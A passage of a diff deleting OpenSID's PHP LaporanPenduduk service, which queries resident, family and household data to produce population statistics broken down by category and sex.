@@ -1,803 +1,465 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Services;
-
-use App\Enums\AsuransiEnum;
-use App\Enums\JenisKelaminEnum;
-use App\Enums\PendidikanSedangEnum;
-use App\Enums\SakitMenahunEnum;
-use App\Enums\Statistik\StatistikJenisBantuanEnum;
-use App\Enums\Statistik\StatistikKeluargaEnum;
-use App\Enums\Statistik\StatistikPendudukEnum;
-use App\Enums\Statistik\StatistikRtmEnum;
-use App\Models\Bantuan;
-use Illuminate\Support\Facades\DB;
-
-class LaporanPenduduk
-{
-    private $lap;
-    private $tahun;
-    private $filter;
-    private $paramCetak;
-
-    public function listData($lap = 0, $filter = [], $paramCetak = [])
-    {
-        $this->lap        = $lap;
-        $this->filter     = $filter;
-        $this->paramCetak = $paramCetak;
-
-        $judul_jumlah = 'JUMLAH';
-        $judul_belum  = 'BELUM MENGISI';
-
-        $data  = $this->select_per_kategori();
-        $semua = $this->get_data_jml();
-        $semua = $this->persentase_semua($semua);
-        $total = $this->hitung_total($data);
-
-        // Statistik tanpa tabel referensi
-        if ($lap === 'bdt') {
-            $data = [];
-        }
-
-        $data[] = $this->baris_jumlah($total, $judul_jumlah);
-        $data[] = $this->baris_belum($semua, $total, $judul_belum);
-        $this->hitung_persentase($data, $semua);
-
-        if ($lap == '14') {
-            $val              = collect($data);
-            $pendidikanSedang = collect(PendidikanSedangEnum::all());
-
-            $data = $pendidikanSedang->map(static function ($item, $key) use ($val) {
-                $valItem = $val->where('id', $key)->first() ?? ['jumlah' => '0', 'laki' => '0', 'perempuan' => '0', 'persen' => '0%', 'persen1' => '0%', 'persen2' => '0%'];
-
-                return [
-                    'id'        => (string) $key,
-                    'nama'      => $item,
-                    'jumlah'    => $valItem['jumlah'],
-                    'laki'      => $valItem['laki'],
-                    'perempuan' => $valItem['perempuan'],
-                    'no'        => $key,
-                    'persen'    => $valItem['persen'],
-                    'persen1'   => $valItem['persen1'],
-                    'persen2'   => $valItem['persen2'],
-                ];
-            })
-                ->merge($val->slice(-3))
-                ->map(static function ($item, $key) {
-                    $item['no'] = in_array($item['id'], [JUMLAH, BELUM_MENGISI, TOTAL]) ? '' : $key + 1;
-
-                    return $item;
-                })
-                ->toArray();
-        }
-
-        return $data;
-    }
-
-    public static function judulStatistik($lap)
-    {
-        if ($bantuan = Bantuan::whereSlug($lap)->first()) {
-            return $bantuan->nama;
-        }
-
-        $list_judul = StatistikPendudukEnum::allKeyLabel() + StatistikKeluargaEnum::allKeyLabel() + StatistikRtmEnum::allKeyLabel() + StatistikJenisBantuanEnum::allKeyLabel();
-
-        return $list_judul[$lap];
-    }
-
-    protected function hitung_persentase(&$data, $semua)
-    {
-        // Hitung semua presentase
-        $counter = count($data);
-
-        // Hitung semua presentase
-        for ($i = 0; $i < $counter; $i++) {
-            $data[$i]['persen']  = persen2($data[$i]['jumlah'], $semua['jumlah']);
-            $data[$i]['persen1'] = persen2($data[$i]['laki'], $semua['jumlah']);
-            $data[$i]['persen2'] = persen2($data[$i]['perempuan'], $semua['jumlah']);
-        }
-
-        $data['total'] = $semua;
-    }
-
-    protected function baris_jumlah($total, $nama)
-    {
-        // Isi Total
-        return [
-            'no'        => '',
-            'id'        => JUMLAH,
-            'nama'      => $nama,
-            'jumlah'    => $total['jumlah'],
-            'perempuan' => $total['perempuan'],
-            'laki'      => $total['laki'],
-        ];
-    }
-
-    protected function baris_belum($semua, $total, $nama)
-    {
-        // Isi data jml belum mengisi
-        $baris_belum = [
-            'no'        => '',
-            'id'        => BELUM_MENGISI,
-            'nama'      => $nama,
-            'jumlah'    => $semua['jumlah'] - $total['jumlah'],
-            'perempuan' => $semua['perempuan'] - $total['perempuan'],
-            'laki'      => $semua['laki'] - $total['laki'],
-        ];
-        if (isset($total['jumlah_nonaktif'])) {
-            $baris_belum['jumlah'] += $total['jumlah_nonaktif'];
-            $baris_belum['perempuan'] += $total['jumlah_nonaktif_perempuan'];
-            $baris_belum['laki'] += $total['jumlah_nonaktif_laki'];
-        }
-
-        return $baris_belum;
-    }
-
-    protected function get_data_jml()
-    {
-        $lap          = $this->lap;
-        $status_dasar = '1';
-
-        //Siapkan data baris rekaps
-        if ((int) $lap == 18) {
-            $semua = $this->data_jml_semua_penduduk()->whereRaw("((DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW()) - TO_DAYS(tanggallahir)), '%Y')+0)>=17 OR (status_kawin IS NOT NULL AND status_kawin <> 1)) AND ktp_el != '3'")->get()->toArray();
-        } elseif ($lap == 'kia') {
-            $semua = $this->data_jml_semua_penduduk()->whereRaw("((DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW()) - TO_DAYS(tanggallahir)), '%Y')+0)<=17)")->get()->toArray();
-        } elseif (in_array($lap, ['kelas_sosial', 'bantuan_keluarga'])) {
-            $semua = $this->data_jml_semua_keluarga();
-        } elseif ($lap == 'bdt') {
-            $semua = $this->data_jml_semua_rtm();
-        } else {
-            $query = $this->data_jml_semua_penduduk($status_dasar);
-            if ($lap == 'hamil') {
-                $semua = $query->where('b.sex', 2);
-            } elseif ($lap == 'buku-nikah') {
-                $semua = $query->where('b.status_kawin', '!=', 1);
-            } elseif ($lap == 'akta-kematian') {
-                $status_dasar = '2';
-                $semua        = $this->data_jml_semua_penduduk($status_dasar);
-            } else {
-                $semua = $query;
-            }
-
-            return $semua->get()->toArray()[0];
-        }
-
-        return $semua[0];
-    }
-
-    protected function data_jml_semua_keluarga()
-    {
-        $dusun = $this->filter['dusun'];
-        $rw    = $this->filter['rw'];
-        $rt    = $this->filter['rt'];
-
-        return DB::table('keluarga_aktif as k')
-            ->selectRaw('COUNT(k.id) as jumlah')
-            ->selectRaw('COUNT(CASE WHEN p.sex = 1 THEN p.id END) as laki')
-            ->selectRaw('COUNT(CASE WHEN p.sex = 2 THEN p.id END) as perempuan')
-            ->leftJoin('tweb_penduduk as p', 'p.id', '=', 'k.nik_kepala')
-            ->leftJoin('tweb_wil_clusterdesa as a', 'p.id_cluster', '=', 'a.id')
-            ->when($dusun, static function ($sq) use ($dusun, $rw, $rt) {
-                $sq->where(static function ($subquery) use ($dusun, $rw, $rt) {
-                    $subquery->where('a.dusun', $dusun);
-                    if ($rw) {
-                        $subquery->where('a.rw', $rw);
-                        if ($rt) {
-                            $subquery->where('a.rt', $rt);
-                        }
-                    }
-                });
-            })->where('k.config_id', identitas('id'))
-            ->get()
-            ->toArray();
-    }
-
-    protected function data_jml_semua_rtm()
-    {
-        $dusun = $this->filter['dusun'];
-        $rw    = $this->filter['rw'];
-        $rt    = $this->filter['rt'];
-
-        return DB::table('tweb_rtm as r')
-            ->selectRaw('COUNT(r.id) as jumlah')
-            ->selectRaw('COUNT(CASE WHEN p.sex = 1 THEN p.id END) as laki')
-            ->selectRaw('COUNT(CASE WHEN p.sex = 2 THEN p.id END) as perempuan')
-            ->leftJoin('tweb_penduduk as p', 'p.id', '=', 'r.nik_kepala') // TODO: Ganti kolom no_kk jadi no_rtm
-            ->leftJoin('tweb_wil_clusterdesa as a', 'p.id_cluster', '=', 'a.id')
-            ->whereNotNull('r.nik_kepala')
-            ->when($dusun, static function ($sq) use ($dusun, $rw, $rt) {
-                $sq->where(static function ($subquery) use ($dusun, $rw, $rt) {
-                    $subquery->where('a.dusun', $dusun);
-                    if ($rw) {
-                        $subquery->where('a.rw', $rw);
-                        if ($rt) {
-                            $subquery->where('a.rt', $rt);
-                        }
-                    }
-                });
-            })->where('r.config_id', identitas('id'))
-            ->get()
-            ->toArray();
-    }
-
-    protected function persentase_semua($semua)
-    {
-        $semua = (array) $semua;
-        // Hitung persentase
-        $semua['no']      = '';
-        $semua['id']      = TOTAL;
-        $semua['nama']    = 'TOTAL';
-        $semua['persen']  = persen2(($semua['laki'] + $semua['perempuan']), $semua['jumlah']);
-        $semua['persen1'] = persen2($semua['laki'], $semua['jumlah']);
-        $semua['persen2'] = persen2($semua['perempuan'], $semua['jumlah']);
-
-        return $semua;
-    }
-
-    protected function data_jml_semua_penduduk($status_dasar = '1')
-    {
-        $idCluster = $this->filter['idCluster'];
-        $query     = DB::table('tweb_penduduk as b')
-            ->selectRaw('COUNT(b.id) as jumlah')
-            ->selectRaw('COUNT(CASE WHEN b.sex = 1 THEN b.id END) as laki')
-            ->selectRaw('COUNT(CASE WHEN b.sex = 2 THEN b.id END) as perempuan')
-            ->leftJoin('tweb_wil_clusterdesa as a', 'b.id_cluster', '=', 'a.id')
-            ->when($idCluster, static function ($sq) use ($idCluster) {
-                $sq->whereIn('a.id', $idCluster);
-            })
-            ->where('b.config_id', identitas('id'))
-            ->where('b.status_dasar', $status_dasar);
-
-        return $query;
-    }
-
-    protected function hitung_total(&$data)
-    {
-        $total['no']        = '';
-        $total['id']        = TOTAL;
-        $total['jumlah']    = 0;
-        $total['laki']      = 0;
-        $total['perempuan'] = 0;
-
-        $data = collect($data)->map(static function ($item) use (&$total) {
-            $item = (array) $item;
-            $total['jumlah'] += $item['jumlah'];
-            $total['laki'] += $item['laki'];
-            $total['perempuan'] += $item['perempuan'];
-
-            return $item;
-        })->toArray();
-
-        return $total;
-    }
-
-    private function str_jml_penduduk(string $where, string $sex = '', string $status_dasar = '1')
-    {
-        $query = DB::table('tweb_penduduk as b')
-            ->selectRaw('COUNT(b.id)')
-            ->leftJoin('tweb_wil_clusterdesa as a', 'b.id_cluster', '=', 'a.id');
-
-        if ($sex !== '' && $sex !== '0') {
-            $query->where('b.sex', $sex);
-        }
-
-        if ($status_dasar !== '1') {
-            $query->leftJoin('log_penduduk as l', 'l.id_pend', '=', 'b.id');
-        }
-
-        $idCluster = $this->filter['idCluster'];
-
-        $query->when($idCluster, static function ($sq) use ($idCluster) {
-            $sq->whereIn('a.id', $idCluster);
-        });
-
-        return $query
-            ->where('b.status_dasar', $status_dasar)
-            ->where('b.config_id', identitas('id'))
-            ->whereRaw($where)
-            ->toRawSql();
-    }
-
-    private function select_jml(string $where, string $status_dasar = '1')
-    {
-        $str_jml_penduduk  = $this->str_jml_penduduk($where, '', $status_dasar);
-        $str_jml_laki      = $this->str_jml_penduduk($where, '1', $status_dasar);
-        $str_jml_perempuan = $this->str_jml_penduduk($where, '2', $status_dasar);
-
-        return [
-            'str_jml_penduduk'  => $str_jml_penduduk,
-            'str_jml_laki'      => $str_jml_laki,
-            'str_jml_perempuan' => $str_jml_perempuan,
-        ];
-    }
-
-    private function select_jml_penduduk_per_kategori(string $id_referensi, string $tabel_referensi)
-    {
-        $query = DB::table("{$tabel_referensi} as u")
-            ->select('u.*')
-            ->selectRaw('COUNT(p.id) AS jumlah')
-            ->selectRaw('COUNT(CASE WHEN p.sex = 1 THEN p.id END) AS laki')
-            ->selectRaw('COUNT(CASE WHEN p.sex = 2 THEN p.id END) AS perempuan')
-            ->leftJoin('penduduk_hidup as p', static function ($join) use ($id_referensi) {
-                $join->on('u.id', '=', "p.{$id_referensi}")
-                    ->where('p.config_id', '=', identitas('id'));
-            })
-            ->leftJoin('tweb_wil_clusterdesa as a', 'p.id_cluster', '=', 'a.id');
-
-        $idCluster = $this->filter['idCluster'];
-
-        $query->when($idCluster, static function ($sq) use ($idCluster) {
-            $sq->whereIn('a.id', $idCluster);
-        });
-
-        // dapatkan semua kolom di table referensi
-        $allColumns = DB::getSchemaBuilder()->getColumnListing($tabel_referensi);
-
-        return $query->groupBy($allColumns);
-    }
-
-    protected function select_per_kategori()
-    {
-        $lap = $this->lap;
-
-        // Bagian Penduduk
-        $statistik_penduduk = [
-            '0'           => ['id_referensi' => 'pendidikan_kk_id', 'tabel_referensi' => 'tweb_penduduk_pendidikan_kk'],
-            '1'           => ['id_referensi' => 'pekerjaan_id', 'tabel_referensi' => 'tweb_penduduk_pekerjaan'],
-            '2'           => ['id_referensi' => 'status_kawin', 'tabel_referensi' => 'tweb_penduduk_kawin'],
-            '3'           => ['id_referensi' => 'agama_id', 'tabel_referensi' => 'tweb_penduduk_agama'],
-            '4'           => ['id_referensi' => 'sex', 'tabel_referensi' => 'tweb_penduduk_sex'],
-            'hubungan_kk' => ['id_referensi' => 'kk_level', 'tabel_referensi' => 'tweb_penduduk_hubungan'],
-            '5'           => ['id_referensi' => 'warganegara_id', 'tabel_referensi' => 'tweb_penduduk_warganegara'],
-            '6'           => ['id_referensi' => 'status', 'tabel_referensi' => 'tweb_penduduk_status'],
-            '7'           => ['id_referensi' => 'golongan_darah_id', 'tabel_referensi' => 'tweb_golongan_darah'],
-            '9'           => ['id_referensi' => 'cacat_id', 'tabel_referensi' => 'tweb_cacat'],
-            // '10'          => ['id_referensi' => 'sakit_menahun_id', 'tabel_referensi' => 'tweb_sakit_menahun'],
-            // '14'          => ['id_referensi' => 'pendidikan_sedang_id', 'tabel_referensi' => 'tweb_penduduk_pendidikan'],
-            '16' => ['id_referensi' => 'cara_kb_id', 'tabel_referensi' => 'tweb_cara_kb'],
-            // '19' => ['id_referensi' => 'id_asuransi', 'tabel_referensi' => 'tweb_penduduk_asuransi'],
-        ];
-
-        switch ("{$lap}") {
-
-            case 'hamil':
-                // Kehamilan
-                $data = $this->select_jml_penduduk_per_kategori('hamil', 'ref_penduduk_hamil');
-
-                return $data->where('p.sex', 2)->get();
-                break;
-
-            case '13':
-                // Umur rentang
-                $where = "(DATE_FORMAT(FROM_DAYS(TO_DAYS( NOW()) - TO_DAYS(tanggallahir)) , '%Y')+0)>=u.dari AND (DATE_FORMAT(FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS(tanggallahir)) , '%Y')+0) <= u.sampai";
-                $jml   = $this->select_jml($where);
-
-                return DB::table('tweb_penduduk_umur as u')
-                    ->select('u.*')
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_penduduk'] . ') as jumlah'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_laki'] . ') as laki'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_perempuan'] . ') as perempuan'))
-                    ->where('u.status', '1')
-                    ->where('u.config_id', identitas('id'))
-                    // kondisi param datatable
-                    ->when($this->paramCetak, static function ($query, $param) {
-                        $query->take($param['length'])->skip($param['start']);
-                    })
-                    ->get();
-                break;
-
-                // with reference enum
-            case '14':
-                $idCluster = $this->filter['idCluster'];
-
-                // Pendidikan Sedang
-                return DB::table('penduduk_hidup as u')
-                    ->select('u.pendidikan_sedang_id as id', 'u.pendidikan_sedang_id as nama')
-                    ->selectRaw('COUNT(u.sex) as jumlah')
-                    ->selectRaw('COUNT(CASE WHEN u.sex = 1 THEN 1 END) as laki')
-                    ->selectRaw('COUNT(CASE WHEN u.sex = 2 THEN 1 END) as perempuan')
-                    ->leftJoin('tweb_wil_clusterdesa as a', 'u.id_cluster', '=', 'a.id')
-                    ->whereNotNull('u.pendidikan_sedang_id')
-                    ->where('u.pendidikan_sedang_id', '!=', '')
-                    ->where('u.config_id', identitas('id'))
-                    ->when($idCluster, static function ($sq) use ($idCluster) {
-                            $sq->whereIn('a.id', $idCluster);
-                        })
-                    ->groupBy('u.pendidikan_sedang_id')
-                    ->get();
-
-                break;
-
-                // with reference enum
-            case '10':
-                // Sakit Menahun
-                    $idCluster = $this->filter['idCluster'];
-
-                    return collect(SakitMenahunEnum::all())->map(static function ($item, $key) use ($idCluster) {
-                        $query = DB::table('penduduk_hidup as p')
-                            ->selectRaw('COUNT(p.id) AS jumlah')
-                            ->selectRaw('COUNT(CASE WHEN p.sex = 1 THEN p.id END) AS laki')
-                            ->selectRaw('COUNT(CASE WHEN p.sex = 2 THEN p.id END) AS perempuan')
-                            ->leftJoin('tweb_wil_clusterdesa as a', 'p.id_cluster', '=', 'a.id')
-                            ->where('p.config_id', '=', identitas('id'))
-                            ->where('p.sakit_menahun_id', '=', $key);
-
-                        $total = $query->when($idCluster, static function ($sq) use ($idCluster) {
-                            $sq->whereIn('a.id', $idCluster);
-                        })->first();
-
-                        return (object) [
-                            'id'        => $key,
-                            'nama'      => $item,
-                            'jumlah'    => (int) $total->jumlah,
-                            'laki'      => (int) $total->laki,
-                            'perempuan' => (int) $total->perempuan,
-                        ];
-                    })->sortBy('nama')->values()->all();
-                break;
-
-            case 'akta-kematian':
-                // Akta Kematian
-                $where = "(DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW()) - TO_DAYS(tanggallahir)), '%Y')+0) >= u.dari
-    AND (DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW()) - TO_DAYS(tanggallahir)), '%Y')+0) <= u.sampai
-    AND l.akta_mati IS NOT NULL
-    AND l.akta_mati != ''
-    AND l.file_akta_mati IS NOT NULL ";
-
-                $jml = $this->select_jml($where, '2');
-
-                return DB::table('tweb_penduduk_umur as u')
-                    ->select('u.*')
-                    ->selectRaw("CONCAT('UMUR ', u.dari, ' S/D ', u.sampai, ' TAHUN') as nama")
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_penduduk'] . ') as jumlah'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_laki'] . ') as laki'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_perempuan'] . ') as perempuan'))
-                    ->where('u.status', '1')
-                    ->where('u.config_id', identitas('id'))
-                // kondisi param datatable
-                    ->when($this->paramCetak, static function ($query, $param) {
-                        $query->take($param['length'])->skip($param['start']);
-                    })
-                    ->get();
-                break;
-
-                // KELUARGA
-            case 'kelas_sosial':
-                // Kelas Sosial
-                return DB::table('tweb_keluarga_sejahtera as u')
-                    ->select('u.*')
-                    ->selectRaw('COUNT(k.id) as jumlah')
-                    ->selectRaw('COUNT(CASE WHEN k.kelas_sosial = u.id AND p.sex = 1 THEN p.id END) AS laki')
-                    ->selectRaw('COUNT(CASE WHEN k.kelas_sosial = u.id AND p.sex = 2 THEN p.id END) AS perempuan')
-                    ->leftJoin('keluarga_aktif as k', static function ($join) {
-                        $join->on('k.kelas_sosial', '=', 'u.id')
-                            ->where('k.config_id', '=', identitas('id'));
-                    })
-                    ->leftJoin('tweb_penduduk as p', 'p.id', '=', 'k.nik_kepala')
-                    ->groupBy(['u.id', 'u.nama'])
-                    ->get();
-                break;
-
-                // RTM
-            case 'bdt':
-                // BDT
-                return DB::table('tweb_rtm as u')
-                    ->selectRaw('COUNT(u.id) as jumlah')
-                    ->selectRaw('COUNT(CASE WHEN p.sex = 1 THEN p.id END) AS laki')
-                    ->selectRaw('COUNT(CASE WHEN p.sex = 2 THEN p.id END) AS perempuan')
-                    ->join('tweb_penduduk as p', 'p.id', '=', 'u.nik_kepala')
-                    ->whereNotNull('u.bdt')
-                    ->where('u.config_id', identitas('id'))
-                    ->groupBy('u.id')
-                    ->get();
-                break;
-
-                // BANTUAN
-            case 'bantuan_penduduk':
-                $sql = 'SELECT u.*,
-                    (SELECT COUNT(kartu_nik) FROM program_peserta WHERE program_id = u.id AND config_id = u.config_id) AS jumlah,
-                    (SELECT COUNT(k.kartu_nik) FROM program_peserta k INNER JOIN tweb_penduduk p ON k.kartu_nik=p.nik WHERE program_id = u.id AND p.sex = 1 AND config_id = u.config_id) AS laki,
-                    (SELECT COUNT(k.kartu_nik) FROM program_peserta k INNER JOIN tweb_penduduk p ON k.kartu_nik=p.nik WHERE program_id = u.id AND p.sex = 2 AND config_id = u.config_id) AS perempuan
-                    FROM program u WHERE (u.config_id = ' . identitas('id') . ' OR u.config_id IS NULL)';
-                break;
-
-                // PENDUDUK
-            case 'hamil':
-                // Kehamilan
-                $data = $this->select_jml_penduduk_per_kategori('hamil', 'ref_penduduk_hamil');
-
-                return $data->where('p.sex', JenisKelaminEnum::PEREMPUAN);
-                break;
-
-            case 'buku-nikah':
-                // kepemilikan buku nikah
-                $data = $this->select_jml_penduduk_per_kategori('status_kawin', 'tweb_penduduk_kawin');
-
-                return $data->where('p.akta_perkawinan', '!=', null)
-                    ->where('p.akta_perkawinan', '!=', '')
-                    ->where('p.status_kawin', '!=', 1)
-                    ->get();
-                break;
-
-            case 'kia':
-                // Kepemilikan kia
-                $where = "((DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW()) - TO_DAYS(tanggallahir)), '%Y')+0)<=17) AND u.status_rekam = status_rekam AND b.ktp_el != '2'";
-                $jml   = $this->select_jml($where);
-
-                return DB::table('tweb_status_ktp as u')
-                    ->select('u.*')
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_penduduk'] . ') as jumlah'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_laki'] . ') as laki'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_perempuan'] . ') as perempuan'))
-                    ->get();
-                break;
-
-            case 'covid':
-                // Covid
-                return DB::table('ref_status_covid as u')
-                    ->select('u.*')
-                    ->selectRaw('COUNT(k.id) as jumlah')
-                    ->selectRaw('COUNT(CASE WHEN k.status_covid = u.id AND p.sex = 1 THEN k.id_terdata END) AS laki')
-                    ->selectRaw('COUNT(CASE WHEN k.status_covid = u.id AND p.sex = 2 THEN k.id_terdata END) AS perempuan')
-                    ->leftJoin('covid19_pemudik as k', static function ($join) {
-                        $join->on('k.status_covid', '=', 'u.id')
-                            ->where('k.config_id', '=', identitas('id'));
-                    })
-                    ->leftJoin('tweb_penduduk as p', 'p.id', '=', 'k.id_terdata')
-                    ->groupBy('u.id', 'u.nama')
-                    ->get();
-                break;
-
-                case 'adat':
-                    // Adat
-                    $idCluster = $this->filter['idCluster'];
-
-                    $query = DB::table('penduduk_hidup as u')
-                        ->select('u.adat as nama', 'u.adat as id')
-                        ->selectRaw('COUNT(u.sex) as jumlah')
-                        ->selectRaw('COUNT(CASE WHEN u.sex = 1 THEN 1 END) as laki')
-                        ->selectRaw('COUNT(CASE WHEN u.sex = 2 THEN 1 END) as perempuan')
-                        ->leftJoin('tweb_wil_clusterdesa as a', 'u.id_cluster', '=', 'a.id')
-                        ->whereNotNull('u.adat')
-                        ->where('u.adat', '!=', null)
-                        ->where('u.adat', '!=', '')
-                        ->where('u.config_id', identitas('id'))
-                        ->groupBy('u.adat')
-                        ->when($idCluster, static function ($sq) use ($idCluster) {
-                            $sq->whereIn('a.id', $idCluster);
-                        })
-                        ->get();
-
-                    return $query;
-
-                    break;
-
-            case 'suku':
-                // Suku
-                $idCluster = $this->filter['idCluster'];
-
-                $query = DB::table('penduduk_hidup as u')
-                    ->select('u.suku as nama', 'u.suku as id')
-                    ->selectRaw('COUNT(u.sex) as jumlah')
-                    ->selectRaw('COUNT(CASE WHEN u.sex = 1 THEN 1 END) as laki')
-                    ->selectRaw('COUNT(CASE WHEN u.sex = 2 THEN 1 END) as perempuan')
-                    ->leftJoin('tweb_wil_clusterdesa as a', 'u.id_cluster', '=', 'a.id')
-                    ->whereNotNull('u.suku')
-                    ->where('u.suku', '!=', '')
-                    ->where('u.config_id', identitas('id'))
-                    ->groupBy('u.suku')
-                    ->when($idCluster, static function ($sq) use ($idCluster) {
-                        $sq->whereIn('a.id', $idCluster);
-                    })
-                    ->get();
-
-                return $query;
-
-                break;
-
-            case 'marga':
-                // Marga
-                $idCluster = $this->filter['idCluster'];
-
-                $query = DB::table('penduduk_hidup as u')
-                    ->select('u.marga as nama', 'u.marga as id')
-                    ->selectRaw('COUNT(u.sex) as jumlah')
-                    ->selectRaw('COUNT(CASE WHEN u.sex = 1 THEN 1 END) as laki')
-                    ->selectRaw('COUNT(CASE WHEN u.sex = 2 THEN 1 END) as perempuan')
-                    ->leftJoin('tweb_wil_clusterdesa as a', 'u.id_cluster', '=', 'a.id')
-                    ->whereNotNull('u.marga')
-                    ->where('u.marga', '!=', null)
-                    ->where('u.marga', '!=', '')
-                    ->where('u.config_id', identitas('id'))
-                    ->groupBy('u.marga')
-                    ->when($idCluster, static function ($sq) use ($idCluster) {
-                        $sq->whereIn('a.id', $idCluster);
-                    })
-                    ->get();
-
-                return $query;
-
-                break;
-
-            case 'bpjs-tenagakerja':
-                // BPJS Tenaga Kerja
-                $data = $this->select_jml_penduduk_per_kategori('pekerjaan_id', 'tweb_penduduk_pekerjaan');
-
-                return $data->where('p.bpjs_ketenagakerjaan', '!=', null)
-                    ->where('p.bpjs_ketenagakerjaan', '!=', '')
-                    ->get();
-
-                break;
-
-            case 'status-asuransi-kesehatan':
-                $idCluster = $this->filter['idCluster'];
-
-                return DB::table('tweb_penduduk as u')
-                    ->select('u.status_asuransi as id')
-                    ->selectRaw("
-                        case
-                            when status_asuransi = 1 then 'Aktif'
-                            when status_asuransi = 0 then 'Tidak Aktif'
-                        end as nama
-                    ")
-                    ->selectRaw('count(u.sex) as jumlah')
-                    ->selectRaw('count(CASE when u.sex = 1 then 1 end) as laki')
-                    ->selectRaw('count(CASE when u.sex = 2 then 1 end) as perempuan')
-                    ->leftJoin('tweb_wil_clusterdesa as a', 'u.id_cluster', '=', 'a.id')
-                    ->whereNotNull('u.status_asuransi')
-                    ->where('u.status_dasar', '1')
-                    ->where('u.config_id', identitas('id'))
-                    ->when($idCluster, static function ($sq) use ($idCluster) {
-                        $sq->whereIn('a.id', $idCluster);
-                    })
-                    ->groupBy('u.status_asuransi')
-                    ->get();
-
-                break;
-
-            case in_array($lap, array_keys($statistik_penduduk)):
-                // Dengan tabel referensi
-                return $this->select_jml_penduduk_per_kategori($statistik_penduduk["{$lap}"]['id_referensi'], $statistik_penduduk["{$lap}"]['tabel_referensi'])->get();
-                break;
-
-            case '15':
-                // Umur kategori
-                $where = "(DATE_FORMAT(FROM_DAYS(TO_DAYS( NOW()) - TO_DAYS(tanggallahir)) , '%Y')+0)>=u.dari AND (DATE_FORMAT(FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS(tanggallahir)) , '%Y')+0) <= u.sampai";
-                $jml   = $this->select_jml($where);
-
-                return DB::table('tweb_penduduk_umur as u')
-                    ->select('u.*')
-                    // ->selectRaw("CONCAT(u.nama, (', u.dari, ' - ', u.sampai, ')') as nama")
-                    ->selectRaw("CONCAT(u.nama, ' (', u.dari, ' - ', u.sampai, ')') as nama")
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_penduduk'] . ') as jumlah'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_laki'] . ') as laki'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_perempuan'] . ') as perempuan'))
-                    ->where('u.status', '0')
-                    ->where('u.config_id', identitas('id'))
-                    // kondisi param datatable
-                    ->when($this->paramCetak, static function ($query, $param) {
-                        $query->take($param['length'])->skip($param['start']);
-                    })
-                    ->get();
-
-                break;
-
-            case '17':
-                // Akta kelahiran
-                $where = "(DATE_FORMAT(FROM_DAYS(TO_DAYS( NOW()) - TO_DAYS(tanggallahir)) , '%Y')+0)>=u.dari AND (DATE_FORMAT(FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS(tanggallahir)) , '%Y')+0) <= u.sampai AND akta_lahir <> '' ";
-                $jml   = $this->select_jml($where);
-
-                return DB::table('tweb_penduduk_umur as u')
-                    ->select('u.*')
-                    ->selectRaw("CONCAT('UMUR ', u.dari, ' S/D ', u.sampai, ' TAHUN') as nama")
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_penduduk'] . ') as jumlah'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_laki'] . ') as laki'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_perempuan'] . ') as perempuan'))
-                    ->where('u.status', '1')
-                    ->where('u.config_id', identitas('id'))
-                // kondisi param datatable
-                    ->when($this->paramCetak, static function ($query, $param) {
-                        $query->take($param['length'])->skip($param['start']);
-                    })
-                    ->get();
-
-                break;
-
-            case '18':
-                // Kepemilikan ktp
-                $where = "((DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW()) - TO_DAYS(tanggallahir)), '%Y')+0)>=17 OR (status_kawin IS NOT NULL AND status_kawin <> 1)) AND u.status_rekam = status_rekam AND b.ktp_el != '3'";
-
-                $jml = $this->select_jml($where);
-
-                return DB::table('tweb_status_ktp as u')
-                    ->select('u.*')
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_penduduk'] . ') as jumlah'))
-                    ->selectRaw(DB::raw('(' . $jml['str_jml_laki'] . ') as laki'))
